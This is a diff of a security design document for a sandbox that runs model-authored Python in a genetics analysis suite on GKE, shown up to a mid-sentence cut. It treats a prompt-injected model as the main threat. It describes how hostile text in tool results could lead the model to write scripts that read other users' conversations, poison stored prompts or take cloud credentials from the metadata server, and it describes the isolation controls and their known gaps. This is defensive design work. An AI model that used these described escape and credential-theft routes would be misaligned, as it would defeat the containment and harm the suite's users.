@@ -1,6213 +1,864 @@
 # Code execution: threat model and security design
 
-Status: **design of record**. Every section ends with a decision. The sandbox
-implementation tasks (`genetics-results-suite-4h6.6` through `.10`, `.14`, `.15`, `.16`)
-implement what is written here; they do not re-open it. Where a decision was a judgement call, the
-alternative and its trigger condition are recorded so a later change is a decision, not a
-rediscovery.
+The model authors Python; that Python runs somewhere and reads suite data. This document
+decides **where it runs, what it can reach, what credential it carries, and who can invoke
+it**, and records the residual risk. Where a decision was a judgement call, the alternative
+and its trigger condition are here so a later change is a decision rather than a rediscovery.
 
-**Scope.** The model authors Python; that Python runs somewhere and reads suite data. This
-document decides *where* it runs, *what it can reach*, *what credential it carries*, and
-*who can invoke it*. It does not cover the SDK's own API surface (`4h6.11`) except where
-that surface becomes a security boundary — see "Handoffs to other tasks".
+**The code is the source of truth for how, and this document for why.** The tables marked
+*generated* are rewritten from the code by `scripts/gen-security-doc.py`; do not edit them by
+hand. Everything else should explain a choice, not restate a value the code already computes —
+`sandbox/supervisor.py`, `k8s/deployments/sandbox.yaml` and
+`k8s/network-policies/sandbox-policy.yaml` are where the mechanisms live.
 
-**And it does not: the SDK's public function list is NOT a containment boundary**
-(`genetics-results-suite-4h6.33`). A script that imports the SDK reaches the full
-`ToolExecutor` through `GeneticsClient._executor` — the underscore there is curation of the
-recommended surface, not enforcement — and httpx is present regardless, since it is the SDK's
-own transport. So a script can call anything the egress policy permits, whether or not the SDK
-wraps it, and "absent from the SDK" must never be read as "unreachable". The egress allow-list
-specified in section 3 ("Egress policy") — not the SDK — is what makes a target unreachable, with
-one exception it does not cover: link-local (169.254.169.254), where the load-bearing defence is
-the node pool's `GKE_METADATA` mode and the missing Workload Identity binding rather than this
-policy (see section 3). And it is the *specified* boundary, not yet a live one: the sandbox is not
-deployed, and `k8s/network-policies/sandbox-policy.yaml` stays decoration until
-`genetics-results-suite-4h6.7` ships a Deployment carrying the labels it selects. The SDK decides
-only what is convenient.
+**The SDK's public function list is not a containment boundary.** A script that imports the
+SDK reaches the full `ToolExecutor` through `GeneticsClient._executor` — the underscore is
+curation, not enforcement — and httpx is present regardless, since it is the SDK's own
+transport. A script can call anything the egress policy permits, whether or not the SDK wraps
+it. "Absent from the SDK" never means "unreachable"; section 3 is what makes a target
+unreachable, with one exception it does not cover (link-local 169.254.169.254, where the
+defence is the node pool's `GKE_METADATA` mode and the missing Workload Identity binding).
 
 **Threat actors, in the order they matter:**
 
-1. **A prompt-injected model.** Tool results and user-supplied attachments enter the
-   model's context. A hostile string in a phenotype description, a Europe PMC abstract or
-   an uploaded TSV can cause the model to author a malicious script. This is the *primary*
-   actor: it needs no attacker access to the cluster and no compromised account.
-2. **An authorized user acting maliciously.** Access is gated by the oauth2-proxy
-   allow-list (named addresses plus `broadinstitute.org` / `finngen.fi` domains), so this
-   is an insider, not an anonymous attacker.
-3. **Anyone who can reach mcp-server.** mcp-server is *not* behind oauth2-proxy and accepts
-   four bearer paths (`MCP_API_KEY`, Google Identity Tokens, per-user chat API tokens,
-   Keycloak OAuth 2.1 tokens from registered third-party clients). Its reachability is
-   materially broader than the browser's, which is why section 5 exists.
+1. **A prompt-injected model.** Tool results and user-supplied attachments enter the model's
+   context. A hostile string in a phenotype description, a Europe PMC abstract or an uploaded
+   TSV can cause the model to author a malicious script. This is the primary actor: it needs
+   no attacker access to the cluster and no compromised account.
+2. **An authorized user acting maliciously.** Access is gated by the oauth2-proxy allow-list,
+   so this is an insider, not an anonymous attacker.
+3. **Anyone who can reach mcp-server.** mcp-server is not behind oauth2-proxy and accepts four
+   bearer paths. Its reachability is materially broader than the browser's, which is why
+   section 5 exists.
 
 ---
 
 ## 1. Why in-process execution is unacceptable
 
-The mechanism already exists in the codebase and is switched off. It is switched off for
-good reasons, and those reasons are the requirements list for everything below.
+The mechanism exists in the codebase and is permanently switched off
+(`ENABLE_SCRIPT_EXECUTION=false` in both chat-backend and mcp-server). The reasons are the
+requirements list for everything below.
 
-**chat-backend runs as root.** `docs/project-spec.md` (Security section) records that
-`results-api`, `chat-backend` and `mcp-server` "still run as root because they raise
-`ulimit`, shell out to `gcloud`, cache tabix indexes, or own root-owned files on the
-`chat-data` PVC". chat-backend additionally sets `fsGroup: 1032` so pre-existing SQLite
-files stay writable once `CAP_DAC_OVERRIDE` is dropped. Model-authored code executing
-inside that pod is uid 0 with a writable `chat-data` PVC mounted at `/data`. That PVC
-holds `chat_history.db` (every conversation in the deployment, all users) and
-`llm_config.db` (**user-authored prompt text**, which is fed back into the system prompt).
-A script running there can read every other user's conversations and can *write* prompt
-text that will later be prepended to somebody else's chat — a persistence primitive, not
-just a read.
+**chat-backend runs as root** with the `chat-data` PVC mounted at `/data`. That PVC holds
+`chat_history.db` (every conversation in the deployment, all users) and `llm_config.db`
+(user-authored prompt text, fed back into the system prompt). A script running there can read
+every other user's conversations and can *write* prompt text that will later be prepended to
+somebody else's chat — a persistence primitive, not just a read.
 
-**The environment allow-list is scar tissue, not caution.**
-`genetics-mcp-server/src/genetics_mcp_server/skills/sandbox_tools.py` (referred to below as
-just `sandbox_tools.py`) line 17
-carries its own history in a comment above `_ALLOWED_ENV_KEYS`:
+**The environment allow-list is scar tissue.** `sandbox_tools.py`'s `_ALLOWED_ENV_KEYS`
+carries its own history: it was a deny-list that missed `INTERNAL_API_SECRET` along with the
+internal service URLs. So an earlier version of exactly this feature leaked the suite's
+internal service credential into model-authored scripts. The allow-list is the correct fix for
+the leak, but it is applied inside the same process, uid, network namespace and mounted PVC as
+the credential it is hiding — the script can read `/proc/self/environ` of any sibling, or open
+`/data/chat_history.db` directly, and neither control applies. `execute_script` additionally
+allows `bash`, and enforces nothing beyond a 30-second `asyncio.wait_for`.
 
-> Environment passed to model-authored scripts, as an allow-list. This was previously a
-> deny-list of key prefixes, which missed `INTERNAL_API_SECRET` (the credential that
-> authenticates as "mcp-tool" to results-api) along with the internal service URLs — every
-> variable nobody thought to add stayed exposed. Anything not named here is dropped.
-
-So an earlier version of exactly this feature leaked the suite's internal service
-credential into model-authored scripts. The allow-list (`PATH`, `HOME`, `LANG`, `LC_ALL`,
-`TMPDIR`, `TZ`, `TERM`, `PWD`, `SHELL`, `USER`) is the correct fix for the *leak*, but it
-is a fix applied inside the same process, same uid, same network namespace and same mounted
-PVC as the credential it is hiding. `_validate_path` (line 26) exists for the same reason:
-path traversal out of the allowed directories was already a live concern in the in-process
-design. Both are string-level defences against code that has full process privileges — the
-script can call `os.environ` from `/proc/self/environ` of any sibling, or simply open
-`/data/chat_history.db` directly, and neither control applies.
-
-`execute_script` (line 104) allows `python3`, `Rscript` **and `bash`**, passes the script on
-stdin, and enforces nothing beyond a 30-second `asyncio.wait_for`. There is no memory cap,
-no pid cap, no output cap and no network restriction whatsoever.
-
-**Current production state (verified).** `ENABLE_SCRIPT_EXECUTION` is `"false"` in
-`k8s/deployments/chat-backend.yaml` (line 119) *and* in `k8s/deployments/mcp-server.yaml`
-(line 65). chat-backend has `SUBAGENT_ALLOWED_PATHS: "/data"` — the chat-data PVC mount
-point — so if the flag were flipped today, model-authored scripts would get root-owned
-read/write access to every conversation in the deployment. mcp-server has
-`SUBAGENT_ALLOWED_PATHS: ""`, which `_validate_path` treats as "no allowed paths
-configured" and rejects.
-
-**Decision.** In-process execution stays permanently disabled.
-`ENABLE_SCRIPT_EXECUTION=false` remains in both deployment manifests and is not a rollout
-toggle for this feature. Code execution moves to a separate pod, in a separate node pool,
-with a separate identity, reached over HTTP from chat-backend only. `sandbox_tools.py`
-keeps `_validate_path` — whose *logic* `read_artifact` reuses (`4h6.15`), but inside the
-sandbox pod and against a `/scratch/<id>/artifacts` allow-list, **never** against
-chat-backend's `SUBAGENT_ALLOWED_PATHS`; see the `read_artifact` subsection in section 6.
-`execute_script` is not the execution path and gains no new callers.
+**Decision.** In-process execution stays disabled and is not a rollout toggle for this
+feature. Code execution moves to a separate pod, in a separate node pool, with a separate
+identity, reached over HTTP from chat-backend only. `sandbox_tools.py`'s `_validate_path`
+logic is reused by `read_artifact` — but inside the sandbox pod, against a
+`/scratch/<id>/artifacts` allow-list, never against chat-backend's `SUBAGENT_ALLOWED_PATHS`.
 
 ---
 
 ## 2. Isolation boundary
 
-The **suite baseline** referred to in the table below is what the suite's *own* service
-containers set: `allowPrivilegeEscalation: false`, `capabilities.drop: ["ALL"]` and
-`RuntimeDefault` seccomp, with `db-api` (uid 10001), `bff` (uid 1000) and — since
-`genetics-results-suite-a7n` — both containers of `auth-gateway` (uid 101, pod-level)
-additionally `runAsNonRoot`. It is **not** a cluster-wide property and never was: eight third-party and
-support workloads set none of it. `docs/project-spec.md` → Security holds the authoritative per-workload list —
-do not duplicate that enumeration here. The sandbox must exceed this baseline, because it
-is the only workload in the cluster that executes attacker-influenceable code *by design*.
+The **suite baseline** is what the suite's own service containers set:
+`allowPrivilegeEscalation: false`, `capabilities.drop: ["ALL"]`, `RuntimeDefault` seccomp, and
+`runAsNonRoot` on several. It is not a cluster-wide property — `docs/project-spec.md` →
+Security holds the authoritative per-workload list. The sandbox must exceed it, because it is
+the only workload in the cluster that executes attacker-influenceable code by design.
 
-### Decisions
+### What the pod declares
 
-| Control | Decision | Why |
-|---|---|---|
-| Base image | `gcr.io/distroless/python3-debian12:nonroot`, multi-stage with a venv built in a `python:3.12-slim` stage | No shell, no package manager, no `curl`. `execute_script`'s `bash` interpreter is not merely un-allow-listed, it is absent from the filesystem. |
-| uid / gid | `runAsNonRoot: true`, `runAsUser: 65532`, `runAsGroup: 65532` | The distroless `nonroot` identity. Deliberately not 1032/1000/10001 — none of the existing suite uids, so no accidental filesystem-permission overlap if a volume is ever attached by mistake. |
-| `readOnlyRootFilesystem` | `true` | Exceeds the cluster baseline. The other containers that set it are `auth-gateway`'s two (`genetics-results-suite-a7n`) and, since `genetics-results-suite-d6n`, the `monitor` CronJob, `frontend`, `oauth2-proxy`, `keycloak`, `keycloak-postgres` and `rag-service` — and every one of them except `oauth2-proxy` needs a writable `emptyDir` to do so (two each for auth-gateway, frontend and keycloak; one at `/tmp` for the monitor and rag-service; one at `/var/run/postgresql`, for the unix socket and its lock file, for `keycloak-postgres`). `oauth2-proxy` and the sandbox need none — the sandbox because its bytecode and matplotlib font cache are baked at build time, oauth2-proxy because its session store is the cookie default. |
-| Capabilities | `drop: ["ALL"]`, no `add` | Matches baseline. |
-| `allowPrivilegeEscalation` | `false` | Matches baseline. |
-| Seccomp | `RuntimeDefault` | Matches baseline; see the rejection note below. |
-| Service account | dedicated KSA `sandbox`, **no** Workload Identity binding, `automountServiceAccountToken: false`, **on a node pool in `GKE_METADATA` mode with a dedicated node service account** | **Critical, and the node pool is load-bearing — see the node-pool spec below.** Eight of the suite's fifteen workloads use `serviceAccountName: genetics-suite`, one names `sandbox` (this one, since `genetics-results-suite-4h6.7`) and the remaining six name no KSA and fall to the namespace `default` (the fifteen are every pod-template workload under `k8s/`: fourteen in `k8s/deployments/`, the two CronJob manifests there included, plus `k8s/cronjobs/keycloak-postgres-backup.yaml` — re-derive rather than trusting these numbers, and note that a `k8s/deployments/`-scoped grep misses the backup CronJob), which `terraform/iam.tf` binds via Workload Identity to a GSA holding `roles/bigquery.dataViewer`, `bigquery.jobUser`, `artifactregistry.reader`, `logging.viewer` and `storage.objectViewer` (five roles; re-derive with `grep 'role  *=' terraform/iam.tf | grep -v workloadIdentityUser` — the bare grep prints six, the sixth being the Workload Identity binding on the GSA itself rather than a permission it grants). **Every one of those resources, the GSA itself and the `roles/iam.workloadIdentityUser` binding are `count = var.manage_iam ? 1 : 0`** — under `manage_iam = false` terraform creates none of them and the platform team owns the equivalent out of band, which is exactly the deployment where the metadata-server defaults bite (section 7). If the sandbox used that KSA, a three-line script hitting the metadata server would obtain direct BigQuery and GCS credentials and every other control in this document would be decoration. The guarantee that no usable GCP credential is reachable is **`GKE_METADATA` mode on the node plus no Workload Identity binding for the KSA** — those two together. `automountServiceAccountToken: false` is not part of that guarantee: it defends the **Kubernetes API server** (no projected KSA token in the container, so no `kubectl`-equivalent access) and defends nothing whatsoever against the GCP metadata server, which is reached over the network and needs no mounted token. The sandbox is **no longer the only** workload that sets it — `auth-gateway` does since `genetics-results-suite-o5i` and `bff`, `frontend`, `keycloak`, `oauth2-proxy` and `keycloak-postgres` since `genetics-results-suite-5ho`, so seven of the fifteen now set it and the other eight name `genetics-suite` and still mount that KSA's token; that is also why `scripts/test-network-policies.py` no longer treats the field as a sandbox-only tell. |
-| Volumes | exactly one `emptyDir`: `/scratch` (`sizeLimit: 512Mi`). **No PVC, ever. No pod-level `/tmp`.** | `chat-data` is the crown jewels (section 1). A pod-level `/tmp` was specified in an earlier draft and is **removed**: it outlives an execution, and with `replicas: 1` and `concurrency: 1` successive users are *guaranteed* to share the same pod, so a shared `/tmp` is a sequential cross-conversation channel (see the Writable-paths row and section 6.4). Temp space comes out of the per-execution directory instead; the 512Mi `sizeLimit` is therefore the combined artifact-plus-temp budget, which makes supervisor-enforced sub-quotas mandatory — see "Staying under `sizeLimit`" below. |
-| Writable paths | `/scratch/<execution-id>/` only, including `/scratch/<execution-id>/tmp`. `TMPDIR`, `HOME`, `MPLCONFIGDIR`, `XDG_CACHE_HOME` and `PYTHONPYCACHEPREFIX` all point inside it. | One directory per execution, created before the fork. Everything in it is deleted on completion, or at a 5-minute TTL if the execution never completes — with the single exception of `/scratch/<execution-id>/artifacts`, which is retained for 5 minutes after completion so `read_artifact` has something to return (see the `read_artifact` subsection in section 6, which is where that lifecycle is settled). Nothing writable is shared between executions. With `readOnlyRootFilesystem: true` and no `/tmp` volume, `/tmp` is not writable at all, so a library that hardcodes it fails loudly at build/test time rather than quietly acquiring a shared channel — which is the outcome we want. If some dependency turns out to require a writable `/tmp` and cannot be redirected, adding the volume back is a **recorded degradation**, not a free fix, and it comes with a hard obligation: the supervisor wipes `/tmp` completely immediately before every fork, so no bytes survive from the previous execution. The supervisor also wipes, at startup, any `/scratch` entry that does not belong to a live or still-retained execution — a crash mid-execution must not leave a readable directory behind. |
-| Memory | `requests: 1Gi`, `limits: 3Gi` | Enough for a polars aggregation over a realistic credible-set pull. The cgroup OOM kill is the enforcement. **It is not a guarantee that the child dies and the supervisor survives** — the kernel picks by `oom_score`, which is a heuristic over RSS, and gVisor changes the accounting because the sentry holds memory on the application's behalf. So this is made deterministic instead: the supervisor sets its own `oom_score_adj` low (e.g. `-500`) and the child's high (e.g. `+500`), and sets `RLIMIT_AS` on the child at a value that leaves the supervisor explicit headroom under the 3Gi cgroup limit. The child hitting `RLIMIT_AS` gets a clean `MemoryError` inside its own process, which is a better failure than an OOM kill in either direction. |
-| CPU | `requests: 500m`, `limits: 1500m` | The mining cap. Note it is **not** comfortably under the node: an `e2-standard-2` has ~1930m allocatable, so a sandbox burning its full limit leaves ~430m for the supervisor's own thread, the kubelet and the gVisor sentry. It is the `requests: 500m` that keeps the pod schedulable; the 1500m limit is a burst ceiling that a co-scheduled workload would contend with. If the pool machine type changes, revisit both numbers together. |
-| pids | `pod_pids_limit: 1024` in the sandbox node pool's `kubelet_config`, plus a child pid budget set from the supervisor's own needs and **far below** that ceiling | Fork-bomb containment. Per-pod pid limits are a kubelet setting, not a pod-spec field, which is a further reason the sandbox needs its own node pool. **`RLIMIT_NPROC` alone does not work as specified in an earlier draft:** it is a limit per *real uid* across the pid namespace, and the supervisor runs as the same uid 65532 as the child, so a child forking to its `RLIMIT_NPROC` also prevents the *supervisor* from forking — the fork bomb takes out the supervisor instead of being contained. Two ways to fix it, and `4h6.7`/`4h6.41` must pick one explicitly: (a) run the child as a **second non-root uid** distinct from the supervisor's, which restores `RLIMIT_NPROC` as a genuine per-execution control; or (b) keep one uid and enforce the pid budget from the supervisor by watching the child's process group and killing it above a threshold sized from what a legitimate script needs (tens of processes, not hundreds) rather than from the kubelet ceiling, treating `RLIMIT_NPROC` as advisory only. (a) is preferred; it costs one extra uid in the image and a `chown` of `/scratch/<execution-id>` to the child uid before the fork — and it has the side benefit of putting the supervisor's memory and the token file out of the child's same-uid reach (section 4, token delivery). It is **not** free of ownership consequences, though: see "Permission contract" below, which `4h6.39`/`4h6.41` must implement in full if they take (a). **DECIDED: (b)** — `4h6.7` picked the shared uid, because (a) needs `CAP_SETUID`/`CAP_SETGID`/`CAP_CHOWN` that this pod drops; see "The uid choice" below for the reasoning and the two costs, and do not read "(a) is preferred" here as the state of the code. |
-| Ephemeral storage | `requests: 1Gi`, `limits: 2Gi` | Backstop under the `emptyDir` `sizeLimit`s. |
-| Wall clock | **60s default, 120s hard ceiling**, not overridable by the model | The current in-process timeout is 30s, which is too short once one script replaces a chain of tool calls; the existing `terminationGracePeriodSeconds` comment in chat-backend.yaml records that a chat turn "routinely runs 1-3 minutes", so 120s is the largest value that does not make the sandbox the dominant term in turn latency. |
-| Output cap | 64 KiB returned to the model (first 32 KiB + last 32 KiB with an explicit elision marker); the reader stops at 8 MiB from the pipe and kills the child | Head-and-tail because the model needs the traceback, which is at the tail. The 8 MiB pipe cap stops `while True: print(...)` from consuming the supervisor's memory before the wall clock fires. The 64 KiB figure is a *context* decision as much as a security one — the epic's justification is the context-accumulation curve (39k → 117k tokens), and an unbounded stdout would defeat it. |
-| Concurrency | **1 execution per pod**, queued beyond that | Measured peak is 23 chat turns/hour (one every ~2.6 minutes), so queueing costs nothing. It removes *simultaneous* cross-user co-tenancy inside the pod: two concurrent children would share a pid namespace and `/proc`, and there is no per-fork isolation available to fix that. **It does NOT remove co-tenancy, and an earlier version of this row claimed it did — `4h6.55` falsified that by measurement.** Concurrency 1 bounds what runs at the same *instant*; the co-tenancy is in the **queue** (up to two other users' requests are held in the supervisor while one executes) and in the **5-minute retention window** (completed executions' directories, and the address space they left behind). See "As built (`4h6.55`)" below for which of the three demonstrated consequences is closed and which two are not. |
-| Replicas | 1 | Peak 23 turns/hour, p95 8, mean 3. Do not build for concurrency that does not exist. |
+<!-- BEGIN GENERATED: pod -->
 
-### What the manifest adds beyond this table
+| field | value |
+|---|---|
+| runtimeClassName | `gvisor` |
+| replicas / strategy | 1 / `Recreate` |
+| serviceAccountName | `sandbox` |
+| automountServiceAccountToken | `false` |
+| enableServiceLinks | `false` |
+| dnsPolicy | `None` |
+| hostAliases | ${DB_API_CLUSTER_IP} → db-api db-api.genetics db-api.genetics.svc db-api.genetics.svc.cluster.local, ${RESULTS_API_CLUSTER_IP} → results-api results-api.genetics results-api.genetics.svc results-api.genetics.svc.cluster.local |
+| uid / gid | runAsUser 65532, runAsGroup 65532, fsGroup 65532, runAsNonRoot `true` |
+| readOnlyRootFilesystem | `true` |
+| allowPrivilegeEscalation | `false` |
+| capabilities | drop ALL, no add |
+| seccompProfile | `RuntimeDefault` |
+| resources | requests cpu 500m, ephemeral-storage 1Gi, memory 1Gi; limits cpu 1500m, ephemeral-storage 2Gi, memory 3Gi |
+| volumes | scratch (emptyDir, sizeLimit 512Mi) |
+| probes | readinessProbe |
+| command / args | `['/genetics/supervisor.py']` |
+| terminationGracePeriodSeconds | 130 |
+| tolerations | sandbox.gke.io/runtime=gvisor:NoSchedule |
+| nodeSelector | workload=sandbox |
 
-`k8s/deployments/sandbox.yaml` (`genetics-results-suite-4h6.7`) implements every row above.
-Five things it declares are **not** in the table, four of them controls this document did not
-specify; the per-field rationale lives in `docs/project-spec.md` → "The sandbox Deployment"
-and is not duplicated here.
+<!-- END GENERATED: pod -->
 
-- **`enableServiceLinks: false`.** Kubernetes otherwise injects `<SERVICE>_SERVICE_HOST` /
-  `_PORT` variables for every Service in the namespace into the pod's environment — the whole
-  internal inventory and its ClusterIPs, handed to untrusted code for free. Nothing in the
-  egress allow-list becomes reachable through them, but the disclosure is gratuitous.
-- **`dnsPolicy: None` with a `127.0.0.1` nameserver and `ndots:1 timeout:1 attempts:1`.** "On
-  DNS" below argues the resolver must not be a sink and that a *stall* is the failure shape to
-  avoid; leaving `dnsPolicy` at the default `ClusterFirst` writes kube-dns into
-  `/etc/resolv.conf` and gets exactly that stall against an egress policy that drops 53/UDP.
-  Pointing the resolver at loopback turns the stall into an immediate `ECONNREFUSED`. It is a
-  second line, not a replacement: `/etc/nsswitch.conf` ordering and `hostAliases` still do the
-  work, and the egress policy is still what denies the network.
-- **`strategy: Recreate` and no `livenessProbe`.** Both are availability decisions with a
-  security edge. A rolling update would put a second sandbox pod on a pool pinned at one node
-  and break "one execution at a time" from per-pod to per-cluster; a liveness probe racing a
-  legitimate 120s execution restarts the pod and kills the script, which the supervisor's own
-  wall clock already handles.
-- **`args: ["/genetics/supervisor.py"]`, and still no `CMD` in the image** (`4h6.50`). The
-  image's ENTRYPOINT is the bare interpreter, so the pod runs
-  `/usr/bin/python3 /genetics/supervisor.py`. The absolute path rather than `-m supervisor`
-  is **not** because the module would fail to resolve — measured in the image, CPython
-  prepends the process's cwd to `sys.path` for `-m` regardless of `PYTHONPATH`, `WORKDIR` is
-  `/genetics`, and `docker run … -m prewarm` exits 0 — but because an absolute path does not
-  depend on the cwd the container happens to start in, and is the same argv
-  `scripts/run-sandbox-local.sh` passes. Keeping the default *out of the image* is what keeps
-  the failure loud: with no `CMD`, a manifest that loses its `args:` starts `python3` with no
-  script and CrashLoopBackOffs — it *schedules*, so this is not the Pending case — behind a
-  `kubectl apply` that returned 0 with nothing waiting on the rollout. `scripts/deploy.sh`
-  therefore refuses to apply the file unless the **container named `sandbox`, in the
-  Deployment named `sandbox`**, declares a non-empty `command:` or `args:`. It parses the file
-  with PyYAML rather than grepping it, so indentation cannot trip it and a `command:` belonging
-  to an initContainer, another container or another document in the file cannot clear it; a
-  file it cannot parse, or a missing PyYAML, fails **closed** with the cause named.
-- **The sandbox image must exist before the manifest is applied** (`4h6.50`). `scripts/build-all.sh`
-  skips the sandbox image **non-fatally** when the resolved genetics-mcp-server branch has no
-  SDK (`4h6.11`) or when the generated schema docs and stubs fail to verify (`4h6.13`). Those
-  skips are correct as guards — neither image is shippable — but while the `args:` refusal above
-  was unclearable they could not reach the cluster, and now they can: a build that omitted the
-  image, followed by a deploy that applies the Deployment, is an ImagePullBackOff behind a
-  `kubectl apply` that returned 0. Both ends are closed. `build-all.sh` no longer signs off with
-  "All images built and pushed." after a skip; it restates the skip as the last line and **exits
-  non-zero when the deployment's tfvars actually sets `sandbox_pool_enabled = true`** (the same
-  derivation deploy.sh uses). `deploy.sh` independently verifies `${REGISTRY}/sandbox:${TAG}`
-  exists in Artifact Registry before applying, treating a definite `NOT_FOUND` as fatal and an
-  unanswerable query (no `gcloud`, no `artifactregistry.reader`) as a warning — inability to
-  answer is not evidence of absence and must not block a deploy.
-- **The apply is gated on the node pool.** `scripts/deploy.sh` skips the file unless
-  `ENABLE_SANDBOX=true`, derived from `sandbox_pool_enabled` in `terraform.tfvars` rather than
-  being a second switch, and refuses the apply outright if no node carries `workload=sandbox`
-  — the pod tolerates a taint only the gVisor pool has, so applying it without the pool leaves
-  a permanently Pending pod behind a `kubectl apply` that returned 0. Both refusals live in a
-  **preflight that runs before the first apply of the deploy**, not in the manifest loop where
-  `sandbox.yaml` sorts second-to-last and an `exit 1` would leave every other manifest applied
-  and every rollout unrolled.
-- **`SANDBOX_ENABLED` on db-api, results-api and chat-backend** stays `"false"` until the separate,
-  deliberate enablement step, and `scripts/test-network-policies.py` reports that pairing as a
-  note instead of a failure **only when it has confirmed against the cluster that no sandbox
-  Deployment is live**. `ENABLE_SANDBOX` alone does not license the relaxation: it means "this
-  run will not apply it", and deploy.sh *skips* the manifest rather than deleting it, so a
-  later gate-off deploy can run against a sandbox that is still serving. A live sandbox with
-  the gate off is a hard failure there; an undeterminable cluster fails closed.
-- **`SANDBOX_URL` on chat-backend is a second, separate variable, and it is not optional.**
-  `SANDBOX_ENABLED` says a sandbox exists; `SANDBOX_URL` says where. It has **no default**:
-  `genetics-results-suite-6um` removed the old `http://127.0.0.1:8080` fallback, because on a dev
-  machine that address is db-api — a real, authenticating service that answers *something* rather
-  than refusing — and in the cluster it is chat-backend's own pod. An unset value now raises
-  `SandboxNotConfigured` at client construction rather than sending `/execute` somewhere
-  arbitrary. `k8s/deployments/chat-backend.yaml` ships
-  `http://sandbox.genetics.svc.cluster.local:8080` unconditionally, set even while
-  `SANDBOX_ENABLED` is `"false"`, so flipping the flag is the only change the enabling deploy
-  makes. Confirmed on the `daly-staging` bring-up: with the address absent, every `run_analysis`
-  failed while the sandbox pod stayed healthy and answered its probes — a silent feature outage,
-  not a security control failing open, since the misdirected request reaches a port nothing
-  serves.
+Four of those need their reason stated, because the value alone does not carry it:
 
-### The uid choice: option (b), one shared uid — DECIDED (`4h6.7`)
+- **The service account is the whole metadata story.** A dedicated KSA `sandbox` with **no
+  Workload Identity binding**, on a node pool in `GKE_METADATA` mode with a dedicated node
+  service account. Most of the suite uses `serviceAccountName: genetics-suite`, which
+  `terraform/iam.tf` binds to a GSA holding BigQuery, GCS and Artifact Registry roles; if the
+  sandbox used it, a three-line script hitting the metadata server would obtain those
+  credentials directly and every other control here would be decoration.
+  `automountServiceAccountToken: false` is **not** part of that guarantee — it defends the
+  Kubernetes API server and does nothing against the metadata server, which is reached over
+  the network and needs no mounted token.
+- **One `emptyDir` and no PVC, ever, and no pod-level `/tmp`.** `chat-data` is the crown
+  jewels (section 1). A pod-level `/tmp` outlives an execution, and with one replica and
+  concurrency 1 successive users are *guaranteed* to share the pod, so a shared `/tmp` is a
+  sequential cross-conversation channel. Temp space comes out of the per-execution directory;
+  the `sizeLimit` is therefore the combined artifact-plus-temp budget, which is what makes the
+  supervisor's sub-quotas mandatory rather than nice to have. If some dependency ever requires
+  a writable `/tmp` and cannot be redirected, re-adding the volume is a **recorded
+  degradation** carrying a hard obligation: wipe it completely before every fork.
+- **`enableServiceLinks: false`.** Kubernetes otherwise injects `<SERVICE>_SERVICE_HOST`/`_PORT`
+  for every Service in the namespace — the whole internal inventory and its ClusterIPs, handed
+  to untrusted code for free. Nothing in the egress allow-list becomes reachable through them,
+  but the disclosure is gratuitous.
+- **`dnsPolicy: None` pointed at loopback.** The resolver must not be a sink, and a *stall* is
+  the failure shape to avoid. `ClusterFirst` writes kube-dns into `/etc/resolv.conf` and gets
+  exactly that stall against an egress policy that drops 53/UDP; loopback turns it into an
+  immediate `ECONNREFUSED`. It is a second line — `/etc/nsswitch.conf` ordering and
+  `hostAliases` do the work, and the egress policy is what denies the network.
 
-The pids row above obliges `4h6.7`/`4h6.41` to pick (a) or (b) explicitly. **The choice is (b):
-the supervisor and the child both run as uid 65532**, which is what `k8s/deployments/sandbox.yaml`
-now declares (`runAsUser: 65532`, `runAsGroup: 65532`, `fsGroup: 65532`, and no second uid
-anywhere).
+`strategy: Recreate` and the absence of a `livenessProbe` are availability decisions with a
+security edge: a rolling update would put a second sandbox pod on a pool pinned at one node and
+break "one execution at a time" from per-pod to per-cluster, and a liveness probe racing a
+legitimate long execution restarts the pod and kills the script the wall clock already handles.
 
-**It is forced, not preferred.** Option (a) needs three things the pod's own hardening
-forecloses: `setuid` to a second uid before the fork, a `chown` of `/scratch/<id>` to that uid,
-and a `chown` of the token file to it at mode `0400`. With `capabilities.drop: ["ALL"]` and
-`allowPrivilegeEscalation: false` the container holds no `CAP_SETUID`, `CAP_SETGID` or
-`CAP_CHOWN` — measured in this pod's shape, `setuid(65533)` and `chown(65533)` both return
-`EPERM`. Taking (a) would mean adding those three capabilities back to the one workload in the
-cluster that executes attacker-influenceable code by design, which contradicts the baseline this
-ticket exists to establish. That trade is not worth `RLIMIT_NPROC`, and it must not be made
-silently by a later ticket that reads only the "(a) is preferred" line above.
+**`args:` rather than a `CMD` in the image.** The image's ENTRYPOINT is the bare interpreter
+and the manifest supplies the script path. Keeping the default *out of the image* is what keeps
+the failure loud: with no `CMD`, a manifest that loses its `args:` starts `python3` with no
+script and CrashLoopBackOffs behind a `kubectl apply` that returned 0. `scripts/deploy.sh`
+refuses to apply the file unless the container named `sandbox`, in the Deployment named
+`sandbox`, declares a non-empty `command:` or `args:` — parsed with PyYAML rather than grepped,
+and failing closed on a file it cannot read.
 
-**What it costs, stated plainly, because the supervisor beads inherit both — `4h6.41` the pid
-budget, `4h6.43` the token file:**
+**Deploy-time gates, all of which exist because a `kubectl apply` that returns 0 is not
+evidence.** `build-all.sh` exits non-zero when it skipped the sandbox image and the
+deployment's tfvars enables the sandbox; `deploy.sh` verifies the image exists in Artifact
+Registry before applying (a definite `NOT_FOUND` is fatal, an unanswerable query is a warning —
+inability to answer is not evidence of absence); and the apply is skipped entirely unless
+`ENABLE_SANDBOX=true`, derived from `sandbox_pool_enabled` in tfvars rather than being a second
+switch, and refused outright if no node carries `workload=sandbox`. Those refusals live in a
+preflight that runs *before the first apply*, not in the manifest loop where an `exit 1` would
+leave every other manifest applied and every rollout unrolled.
 
-- **`RLIMIT_NPROC` is not a per-execution control.** It is a limit per *real uid* across the pid
-  namespace, so a child forking to its limit also stops the supervisor forking. `4h6.41` must
-  enforce the pid budget from the supervisor — watch the child's process group and kill above a
-  threshold sized from what a legitimate script needs (tens of processes) — and treat
-  `RLIMIT_NPROC` as advisory only. The kubelet's `pod_pids_limit: 1024` remains the outer
-  backstop and is not a substitute.
+**`SANDBOX_URL` on chat-backend has no default and is not optional.** `SANDBOX_ENABLED` says a
+sandbox exists; `SANDBOX_URL` says where. The old `http://127.0.0.1:8080` fallback was removed
+because on a dev machine that address is db-api — a real, authenticating service that answers
+*something* rather than refusing — and in the cluster it is chat-backend's own pod. An unset
+value now raises `SandboxNotConfigured` at client construction. The manifest ships the address
+unconditionally, even while `SANDBOX_ENABLED` is false, so flipping the flag is the only change
+the enabling deploy makes.
+
+### The uid choice: one shared uid, and it is forced
+
+The supervisor and the child both run as uid 65532. The alternative — a distinct child uid —
